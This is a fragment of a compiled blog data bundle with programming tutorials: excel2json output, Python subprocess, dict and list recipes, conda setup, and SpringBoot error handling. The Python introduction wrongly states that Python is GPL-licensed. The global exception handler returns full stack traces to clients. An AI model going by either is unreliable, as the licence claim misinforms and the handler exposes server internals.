"EmpRole" :   "Author" \n     } \n ] \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Cars.json \n \n [ \n     { \n         "Car Name" :   "Honda City" , \n         "Car Model" :   "City" , \n         "Car Maker" :   "Honda" , \n         "Car Price" :   "20,000 USD" \n     } , \n     { \n         "Car Name" :   "Bugatti Chiron" , \n         "Car Model" :   "Chiron" , \n         "Car Maker" :   "Bugatti" , \n         "Car Price" :   "3 Million USD" \n     } , \n     { \n         "Car Name" :   "Ferrari 458" , \n         "Car Model" :   458.0 , \n         "Car Maker" :   "Ferrari" , \n         "Car Price" :   "2,30,000 USD" \n     } \n ] \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Numbers.json \n \n [ \n     { \n         "1.0" :   3.0 , \n         "2.0" :   4.0 \n     } , \n     { \n         "1.0" :   "N1" , \n         "2.0" :   "N2" \n     } , \n     { \n         "1.0" :   5.0 , \n         "2.0" :   6.0 \n     } , \n     { \n         "1.0" :   7.0 , \n         "2.0" :   8.0 \n     } \n ] \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 If you have to read the excel file from a URL, use convert_from_url() function. \n Limitations of excel2json-3 module \n \n The plugin has very limited features. \n There are no options to skip any sheet, rows, and columns. This makes it hard to use with bigger excel files. \n The JSON is saved into files. Most of the times, we want to convert to JSON and use it in our program rather than saving it as a file. \n The integers are getting converted to the floating point numbers. \n \n'},{title:"Python 连续运行多条批处理无效",frontmatter:{title:"Python 连续运行多条批处理无效",date:"2021-03-03T17:42:43.000Z",tags:["python","cmd"],categories:"python",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/python/python-lian-xu-yun-xing-duo-tiao-pi-chu-li-wu-xiao.html",relativePath:"blogs/python/python-lian-xu-yun-xing-duo-tiao-pi-chu-li-wu-xiao.md",key:"v-1bd08d35",path:"/blogs/python/python-lian-xu-yun-xing-duo-tiao-pi-chu-li-wu-xiao.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在 os.system 中连续执行多条语句的情况，语句如下 \n cmd1 = 'cd ' + filepath + i\ncmd2 = '.\\gradlew build'\n \n 如果分为两次执行，即: os.system(cmd1) os.system(cmd2)，在执行第二条语句的时候会提示gradlew 不是内部命令，也就是没有进入到相应的路径。 \n os.system 的工作原理如下：\nExecute the command (a string) in a subshell. This is implemented by calling the Standard C function system(), and has the same limitations... \n 关于子进程的创建需要明确两点：父进程的环境变量 (environment variables) 会默认传递到子进程中(工作目录PWD就是环境变量之一)\n使用 system 函数，子进程无法影响父进程中的环境变量\n根据这两点，执行 os.system(path) 引发的工作目录变更作用范围仅限于第一个被创建的子进程，故而当前的工作目录没有变更，到执行 os.system(upd) 就会报错 \n 要达到预期的效果，如果仍使用os.system，有两种方法。 \n \n 确保工作目录的变更和svn都在子进程中进行，可以使用复合语句（如 os.system('cd path-to-repo && svn ci')）或多个语句（如os.system('cd path-to-repo; svn ci')）。 \n 先在父进程中切换工作目录(os.chdir('path-to-repo'))，再利用1.中提到的原理，执行子进程即可(os.system('svn ci'))。 \n \n"},{title:"Python创建字典（Map）",frontmatter:{title:"Python创建字典（Map）",date:"2021-05-15T13:12:11.000Z",tags:["python","map"],categories:"python",published:!0,hideInList:!0,feature:null,isTop:!1},regularPath:"/blogs/python/python_create_map.html",relativePath:"blogs/python/python_create_map.md",key:"v-5c7797b3",path:"/blogs/python/python_create_map.html",excerpt:'<h1 id="创建空字典"><a class="header-anchor" href="#创建空字典">#</a> 创建空字典</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>\n<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">type</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span>\n<span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">\'dict\'</span><span class="token operator">></span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e<h1 id="直接赋值创建"><a class="header-anchor" href="#直接赋值创建">#</a> 直接赋值创建</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">\'spam\'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">\'egg\'</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">\'bar\'</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span>\n<span class="token operator">>></span><span class="token operator">></span> dic\n<span class="token punctuation">{</span><span class="token string">\'bar\'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">\'egg\'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">\'spam\'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e<h1 id="通过关键字dict和关键字参数创建"><a class="header-anchor" href="#通过关键字dict和关键字参数创建">#</a> 通过关键字dict和关键字参数创建</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>spam <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> egg <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> bar <span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>\n<span class="token operator">>></span><span class="token operator">></span> dic\n<span class="token punctuation">{</span><span class="token string">\'bar\'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">\'egg\'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">\'spam\'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e<h1 id="通过二元组列表创建"><a class="header-anchor" href="#通过二元组列表创建">#</a> 通过二元组列表创建</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">\'spam\'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">\'egg\'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">\'bar\'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>\n<span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>\n<span class="token operator">>></span><span class="token operator">></span> dic\n<span class="token punctuation">{</span><span class="token string">\'bar\'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">\'egg\'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">\'spam\'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e<h1 id="dict和zip结合创建"><a class="header-anchor" href="#dict和zip结合创建">#</a> dict和zip结合创建</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token string">\'abc\'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n<span class="token operator">>></span><span class="token operator">></span> dic\n<span class="token punctuation">{</span><span class="token string">\'a\'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">\'c\'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">\'b\'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e<h1 id="通过字典推导式创建"><a class="header-anchor" href="#通过字典推导式创建">#</a> 通过字典推导式创建</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token operator">*</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span>\n<span class="token operator">>></span><span class="token operator">></span> dic\n<span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">}</span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e<h1 id="通过dict-fromkeys-创建"><a class="header-anchor" href="#通过dict-fromkeys-创建">#</a> 通过dict.fromkeys()创建</h1>\n\x3c!--beforebegin--\x3e<div class="language-python line-numbers-mode">\x3c!--afterbegin--\x3e<pre v-pre class="language-python"><code><span class="token operator">>></span><span class="token operator">></span> dic <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">\'x\'</span><span class="token punctuation">)</span>\n</code></pre>\n<div class="line-numbers-wrapper"><span class="line-number">1</span><br></div>\x3c!--beforeend--\x3e</div>\x3c!--afterend--\x3e',lastUpdated:"3/6/2022, 3:57:06 PM",content:" 创建空字典 \n >> >  dic  =   { } \n >> >   type ( dic ) \n < type   'dict' > \n \n 1 2 3 #  直接赋值创建 \n >> >  dic  =   { 'spam' : 1 ,   'egg' : 2 ,   'bar' : 3 } \n >> >  dic\n { 'bar' :   3 ,   'egg' :   2 ,   'spam' :   1 } \n \n 1 2 3 #  通过关键字dict和关键字参数创建 \n >> >  dic  =   dict ( spam  =   1 ,  egg  =   2 ,  bar  = 3 ) \n >> >  dic\n { 'bar' :   3 ,   'egg' :   2 ,   'spam' :   1 } \n \n 1 2 3 #  通过二元组列表创建 \n >> >   list   =   [ ( 'spam' ,   1 ) ,   ( 'egg' ,   2 ) ,   ( 'bar' ,   3 ) ] \n >> >  dic  =   dict ( list ) \n >> >  dic\n { 'bar' :   3 ,   'egg' :   2 ,   'spam' :   1 } \n \n 1 2 3 4 #  dict和zip结合创建 \n >> >  dic  =   dict ( zip ( 'abc' ,   [ 1 ,   2 ,   3 ] ) ) \n >> >  dic\n { 'a' :   1 ,   'c' :   3 ,   'b' :   2 } \n \n 1 2 3 #  通过字典推导式创建 \n >> >  dic  =   { i : 2 * i  for  i  in   range ( 3 ) } \n >> >  dic\n { 0 :   0 ,   1 :   2 ,   2 :   4 } \n \n 1 2 3 #  通过dict.fromkeys()创建 \n >> >  dic  =   dict . fromkeys ( range ( 3 ) ,   'x' ) \n < ! - -  more  - - > \n\n >> >  dic\n { 0 :   'x' ,   1 :   'x' ,   2 :   'x' } \n \n 1 2 3 4 5 #  其他 \n >> >   list   =   [ 'x' ,   1 ,   'y' ,   2 ,   'z' ,   3 ] \n >> >  dic  =   dict ( zip ( list [ : : 2 ] ,   list [ 1 : : 2 ] ) ) \n >> >  dic\n { 'y' :   2 ,   'x' :   1 ,   'z' :   3 } \n \n 1 2 3 4 "},{title:"conda init doesn't work in bash on Windows",frontmatter:{title:"conda init doesn't work in bash on Windows",date:"2022-02-19T19:36:52.000Z",tags:["conda"],categories:"python",published:!0,hideInList:!0,feature:null,isTop:!1},regularPath:"/blogs/python/python_conda_doesn't_work.html",relativePath:"blogs/python/python_conda_doesn't_work.md",key:"v-0d74b689",path:"/blogs/python/python_conda_doesn't_work.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n conda init creates a .bash_profile file with the correct initialisation, but git-bash.exe loads .bashrc (thanks to Auss' comment) \n My bash home directory was not equal to my windows home directory. Conda created  C:\\Users\\<username>\\.bash_profile  and bash needs  ~/.bashrc , but ~/ was not equal to  C:\\Users\\<username>\\ . \n \n solution was to run next command in git terminal or VS Code \n conda init  bash \n cat  ~/.bash_profile  >>  ~/.bashrc\n source  ~/.bashrc\nconda activate base\n \n 1 2 3 4 "},{title:"python如何不生成pycache文件夹",frontmatter:{title:"python如何不生成pycache文件夹",date:"2021-12-27 23:28:17",tags:["Python"],categories:"python",published:!0,hideInList:!0,feature:null,isTop:!1},regularPath:"/blogs/python/python_remove_pycache.html",relativePath:"blogs/python/python_remove_pycache.md",key:"v-90f76eae",path:"/blogs/python/python_remove_pycache.html",headers:[{level:2,title:"前言",slug:"前言"},{level:2,title:"什么时候会出现_pycache_文件夹？",slug:"什么时候会出现-pycache-文件夹"},{level:2,title:"如何不生成编译文件呢：",slug:"如何不生成编译文件呢"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 前言 \n 用python编写好一个工程，在第一次运行后，总会发现工程根目录下生成了一个__pycache__文件夹，里面是和py文件同名的各种  *.pyc  或者  *.pyo  文件。 \n 先大概了解一下python基本运行机制。Python程序运行时不需要编译成二进制代码，而直接从源码运行程序，简单来说是，Python解释器将源码转换为字节码，然后再由解释器来执行这些字节码。 \n 解释器的具体工作： \n \n \n 完成模块的加载和链接； \n \n \n 将源代码编译为PyCodeObject对象(即字节码)，写入内存中，供CPU读取； \n \n \n 从内存中读取并执行，结束后将PyCodeObject写回硬盘当中，也就是复制到.pyc或.pyo文件中，以保存当前目录下所有脚本的字节码文件； \n \n \n 之后若再次执行该脚本，它先检查【本地是否有上述字节码文件】和【该字节码文件的修改时间是否与其脚本一致】。是就直接执行，否则重复上述步骤。 \n \n \n pyc文件的生成是什么情况下生成呢： \n python解释器会将  *.py  脚本文件进行编译，并将编译结果保存到__pycache__目录中。 \n 下次再执行工程时，若解释器发现这个  *.py  脚本没有修改过，就会跳过编译这一步，直接运行以前生成的保存在  __pycache__ 文件夹里的 *.pyc  文件。\n这样工程较大时就可以大大缩短项目运行前的准备时间；如果你只需执行一个小工程，没关系 忽略这个文件夹就行。 \n 什么时候会出现__pycache__文件夹？ \n 工程目录下有__main__.py文件，和其他将要调用的模块时。如果只有当前运行的脚本 " main "，则不会生成  pycache  的文件。 \n 当 import导入另一个模块的时候会生成\npython3会生成  pycache \n 如何不生成编译文件呢： \n \n 执行的时候 使用 -B参数 即 \n \n python3 -B test.py\n \n 1 里面的包含的就不会生成pyc了 \n \n 设置环境变量 \n \n export   PYTHONDONTWRITEBYTECODE = 1 \n \n 1 \n 在引入的地方写 \n \n import  sys\nsys.dont_write_bytecode  =  True\n \n 1 2 以上三种方式都可以实现不生成pyc文件。 \n'},{title:"Python 多线程运行批处理文件",frontmatter:{title:"Python 多线程运行批处理文件",date:"2021-03-03T10:25:53.000Z",tags:["python","cmd"],categories:"python",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/python/python_running_batch_files_with_multiple_threads.html",relativePath:"blogs/python/python_running_batch_files_with_multiple_threads.md",key:"v-7e1ece56",path:"/blogs/python/python_running_batch_files_with_multiple_threads.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \n 有时需要同时运行多个不同的批处理文件，可以使用多线程方式来实现。 \n \n import  os\n import  threading\n\nreports  =   [ '1' ,   '2' ,   '3' ,   '4' ]   # 批处理文件名 \nfilepath  =   '**'   # 批处理文件路径 \n\n\n def   run_bat ( i ) :    # 定义运行python文件函数 \n    os . system ( filepath  +  i  +   '.bat' ) \n\n\n if  __name__  ==   '__main__' :    # 多线程运行python文件 \n     for  i  in  reports : \n        task  =  threading . Thread ( target = run_bat ,  args = ( i ,   ) ) \n        task . start ( ) \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 "},{title:"Python 列表（List）遍历方法",frontmatter:{title:"Python 列表（List）遍历方法",date:"2021-04-06T16:17:27.000Z",tags:["python","list"],categories:"python",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/python/python_traversal_list.html",relativePath:"blogs/python/python_traversal_list.md",key:"v-15b41f32",path:"/blogs/python/python_traversal_list.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' #方法1 \n for  i  in   list :    #多个值相同的时候，取的下标不正确 \n     print   ( "序号：%s   值：%s"   %   ( list . index ( i )   +   1 ,  i ) ) \n \n 1 2 #方法2 \n for  i  in   range ( len ( list ) ) : \n     print   ( "序号：%s   值：%s"   %   ( i  +   1 ,   list [ i ] ) ) \n \n 1 2 #方法3 \n for  i ,  val  in   enumerate ( list ) : \n     print   ( "序号：%s   值：%s"   %   ( i  +   1 ,  val ) ) \n \n 1 2 #方法4 \n for  i ,  val  in   enumerate ( list ,   2 ) : \n     print   ( "序号：%s   值：%s"   %   ( i  +   1 ,  val ) ) \n \n 1 2 '},{title:"Python 字典（Map）遍历方法",frontmatter:{title:"Python 字典（Map）遍历方法",date:"2021-04-06T16:30:29.000Z",tags:["python","map"],categories:"python",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/python/python_traversal_map.html",relativePath:"blogs/python/python_traversal_map.md",key:"v-61e83e96",path:"/blogs/python/python_traversal_map.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" a  =   { 'a' :   '1' ,   'b' :   '2' ,   'c' :   '3' } \n \n 1 #  （1）遍历key值 \n for  key  in  a : \n     print ( key + ':' + a [ key ] ) \n\n for  key  in  a . keys ( ) : \n     print ( key + ':' + a [ key ] ) \n \n 1 2 3 4 5 #  （2）遍历value值 \n for  value  in  a . values ( ) : \n     print ( value ) \n \n 1 2 #  （3）遍历字典项 \n for  kv  in  a . items ( ) : \n     print ( kv ) \n\n >> > ( 'a' ,   '1' ) \n >> > ( 'b' ,   '2' ) \n >> > ( 'c' ,   '3' ) \n \n 1 2 3 4 5 6 #  （4）遍历字典健值 \n for  key , value  in  a . items ( ) : \n     print ( key + ':' + value ) \n\n for   ( key , value )   in  a . items ( ) : \n     print ( key + ':' + value ) \n\n >> > a : 1 \n >> > b : 2 \n >> > c : 3 \n \n 1 2 3 4 5 6 7 8 9 "},{title:"Welcome To Python",frontmatter:{title:"Welcome To Python",date:"2021-02-27T14:22:32.000Z",tags:["Python"],categories:"python",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/python/python_welcome-to-python.html",relativePath:"blogs/python/python_welcome-to-python.md",key:"v-7e955396",path:"/blogs/python/python_welcome-to-python.html",headers:[{level:2,title:"Python 简介",slug:"python-简介"},{level:2,title:"Python 发展历史",slug:"python-发展历史"},{level:2,title:"Python 特点",slug:"python-特点"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Python 简介 \n Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。 \n Python 的设计具有很强的可读性，相比其他语言经常使用英文关键字，其他语言的一些标点符号，它具有比其他语言更有特色语法结构。 \n \n \n Python 是一种解释型语言： 这意味着开发过程中没有了编译这个环节。类似于PHP和Perl语言。 \n \n \n Python 是交互式语言： 这意味着，您可以在一个 Python 提示符 >>> 后直接执行代码。 \n \n \n Python 是面向对象语言: 这意味着Python支持面向对象的风格或代码封装在对象的编程技术。 \n \n \n Python 是初学者的语言：Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 WWW 浏览器再到游戏。 \n Python 发展历史 \n Python 是由 Guido van Rossum 在八十年代末和九十年代初，在荷兰国家数学和计算机科学研究所设计出来的。 \n Python 本身也是由诸多其他语言发展而来的,这包括 ABC、Modula-3、C、C++、Algol-68、SmallTalk、Unix shell 和其他的脚本语言等等。 \n 像 Perl 语言一样，Python 源代码同样遵循 GPL(GNU General Public License)协议。 \n 现在 Python 是由一个核心开发团队在维护，Guido van Rossum 仍然占据着至关重要的作用，指导其进展。 \n Python 2.7 被确定为最后一个 Python 2.x 版本，它除了支持 Python 2.x 语法外，还支持部分 Python 3.1 语法 \n Python 特点 \n 1.易于学习：Python有相对较少的关键字，结构简单，和一个明确定义的语法，学习起来更加简单。 \n 2.易于阅读：Python代码定义的更清晰。 \n 3.易于维护：Python的成功在于它的源代码是相当容易维护的。 \n 4.一个广泛的标准库：Python的最大的优势之一是丰富的库，跨平台的，在UNIX，Windows和Macintosh兼容很好。 \n 5.互动模式：互动模式的支持，您可以从终端输入执行代码并获得结果的语言，互动的测试和调试代码片断。 \n 6.可移植：基于其开放源代码的特性，Python已经被移植（也就是使其工作）到许多平台。 \n 7.可扩展：如果你需要一段运行很快的关键代码，或者是想要编写一些不愿开放的算法，你可以使用C或C++完成那部分程序，然后从你的Python程序中调用。 \n 8.数据库：Python提供所有主要的商业数据库的接口。 \n 9.GUI编程：Python支持GUI可以创建和移植到许多系统调用。 \n 10.可嵌入: 你可以将Python嵌入到C/C++程序，让你的程序的用户获得"脚本化"的能力。 \n'},{title:"SpringBoot系列: 404、500异常页面配置",frontmatter:{title:"SpringBoot系列: 404、500异常页面配置",date:"2021-11-01 21:30:39",tags:["SpringBoot系列","异常页面","web"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springBoot_404_500.html",relativePath:"blogs/springboot/springBoot_404_500.md",key:"v-a67a6d56",path:"/blogs/springboot/springBoot_404_500.html",headers:[{level:2,title:"异常页面配置",slug:"异常页面配置"},{level:2,title:"项目源码",slug:"项目源码"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 当出现异常的场景下，如404请求url不存在，，403无权，500服务器异常时，我们可以如何处理 \n 异常页面配置 \n 在SpringBoot项目中，本身提供了一个默认的异常处理页面，当我们希望使用自定义的404,500等页面时，可以如何处理呢？ \n \n 默认异常页面配置\n在默认的情况下，要配置异常页面非常简单，在资源路径下面，新建 error 目录，在下面添加400.html, 500.html页面即可 \n \n 项目结构如上，注意这里的实例demo是没有使用模板引擎的，所以我们的异常页面放在static目录下；如果使用了如FreeMaker模板引擎时，可以将错误模板页面放在template目录下 \n 接下来实际测试下是否生效, 我们先定义一个可能出现服务器500的服务 \n @Controller \n @RequestMapping ( path  =   "page" ) \n public   class   ErrorPageRest   { \n\n     @ResponseBody \n     @GetMapping ( path  =   "divide" ) \n     public   int   divide ( int  sub )   { \n         System . out . println ( "divide1" ) ; \n         return   1000   /  sub ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 请求一个不存在的url，返回我们定义的400.html页面\n http://localhost:8080/page/divide2 \n < html > \n < head > \n     < title > 404页面 </ title > \n </ head > \n < body > \n < h3 > 页面不存在 </ h3 > \n </ body > \n </ html > \n \n 1 2 3 4 5 6 7 8 请求一个服务器500异常，返回我们定义的500.html页面\n http://localhost:8080/page/divide?sub=0 \n < html > \n < head > \n     < title > 500页面 </ title > \n </ head > \n < body > \n < h2   style = " color :  red ; " > 服务器出现异常!!! </ h2 > \n </ body > \n </ html > \n \n 1 2 3 4 5 6 7 8 \n BasicErrorController\n看上面的使用比较简单，自然会有个疑问，这个异常页面是怎么返回的呢？ \n \n 从项目启动的日志中，注意一下 RequestMappingHandlerMapping \n 可以发现里面有个/error的路径不是我们自己定义的，从命名上来看，这个多半就是专门用来处理异常的Controller -> BasicErrorController， 部分代码如下 \n @Controller \n @RequestMapping ( "${server.error.path:${error.path:/error}}" ) \n public   class   BasicErrorController   extends   AbstractErrorController   { \n\n\n     @RequestMapping ( produces  =   MediaType . TEXT_HTML_VALUE ) \n     public   ModelAndView   errorHtml ( HttpServletRequest  request ,   HttpServletResponse  response )   { \n         HttpStatus  status  =   getStatus ( request ) ; \n         Map < String ,   Object >  model  =   Collections \n                 . unmodifiableMap ( getErrorAttributes ( request ,   getErrorAttributeOptions ( request ,   MediaType . TEXT_HTML ) ) ) ; \n        response . setStatus ( status . value ( ) ) ; \n         ModelAndView  modelAndView  =   resolveErrorView ( request ,  response ,  status ,  model ) ; \n         return   ( modelAndView  !=   null )   ?  modelAndView  :   new   ModelAndView ( "error" ,  model ) ; \n     } \n\n\n     @RequestMapping \n     public   ResponseEntity < Map < String ,   Object > >   error ( HttpServletRequest  request )   { \n         HttpStatus  status  =   getStatus ( request ) ; \n         if   ( status  ==   HttpStatus . NO_CONTENT )   { \n             return   new   ResponseEntity < > ( status ) ; \n         } \n         Map < String ,   Object >  body  =   getErrorAttributes ( request ,   getErrorAttributeOptions ( request ,   MediaType . ALL ) ) ; \n         return   new   ResponseEntity < > ( body ,  status ) ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 这个Controller中，一个返回网页的接口，一个返回Json串的接口；我们前面使用的应该是第一个，那我们什么场景下会使用到第二个呢？ \n \n 通过制定请求头的Accept，来限定我们只希望获取json的返回即可 \n \n \n 小结\n本篇内容比较简单，归纳为两句话如下 \n \n 将自定义的异常页面根据http状态码命名，放在/error目录下\n在异常状况下，根据返回的http状态码找到对应的异常页面返回 \n 项目源码 \n 项目: \n'},{title:"SpringBoot系列: 全局异常处理",frontmatter:{title:"SpringBoot系列: 全局异常处理",date:"2021-11-01 21:45:39",tags:["SpringBoot系列","异常处理","web"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springBoot_handle_global_exception.html",relativePath:"blogs/springboot/springBoot_handle_global_exception.md",key:"v-8b9b4e56",path:"/blogs/springboot/springBoot_handle_global_exception.html",headers:[{level:2,title:"异常处理",slug:"异常处理"},{level:3,title:"异常捕获",slug:"异常捕获"},{level:3,title:"示例服务",slug:"示例服务"},{level:3,title:"测试说明",slug:"测试说明"},{level:2,title:"项目源码",slug:"项目源码"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 当我们的后端应用出现异常时，通常会将异常状况包装之后再返回给调用方或者前端，在实际的项目中，不可能对每一个地方都做好异常处理，再优雅的代码也可能抛出异常，那么在Spring项目中，可以怎样优雅的处理这些异常呢? \n 本文将介绍一种全局异常处理方式，主要包括以下知识点 \n \n @ControllerAdvice Controller增强 \n @ExceptionHandler 异常捕获 \n @ResponseStatus 返回状态码 \n NoHandlerFoundException处理（404异常捕获） \n 异常处理 \n \n @ControllerAdvice \n我们通常利用 @ControllerAdvice 配合注解 @ExceptionHandler 来实现全局异常捕获处理 \n \n \n @ControllerAdvice 为所有的 Controller 织入增强方法 \n @ExceptionHandler 标记在方法上，表示当出现对应的异常抛出到上层时（即没有被业务捕获），这个方法会被触发\n下面我们通过实例进行功能演示 \n 异常捕获 \n 我们定义两个异常捕获的case，一个是除0，一个是数组越界异常 \n @Slf4j \n @ControllerAdvice \n public   class   GlobalExceptionHandler   { \n\n     public   static   String   getThrowableStackInfo ( Throwable  e )   { \n         ByteArrayOutputStream  buf  =   new   ByteArrayOutputStream ( ) ; \n        e . printStackTrace ( new   java . io . PrintWriter ( buf ,   true ) ) ; \n         String  msg  =  buf . toString ( ) ; \n         try   { \n            buf . close ( ) ; \n         }   catch   ( Exception  t )   { \n             return  e . getMessage ( ) ; \n         } \n         return  msg ; \n     } \n\n     @ResponseBody \n     @ExceptionHandler ( value  =   ArithmeticException . class ) \n     public   String   handleArithmetic ( HttpServletRequest  request ,   HttpServletResponse  response ,   ArithmeticException  e ) \n             throws   IOException   { \n        log . info ( "divide error!" ) ; \n         return   "divide 0: "   +   getThrowableStackInfo ( e ) ; \n     } \n\n     @ResponseBody \n     @ExceptionHandler ( value  =   ArrayIndexOutOfBoundsException . class ) \n     public   String   handleArrayIndexOutBounds ( HttpServletRequest  request ,   HttpServletResponse  response , \n             ArrayIndexOutOfBoundsException  e )   throws   IOException   { \n        log . info ( "array index out error!" ) ; \n         return   "aryIndexOutOfBounds: "   +   getThrowableStackInfo ( e ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 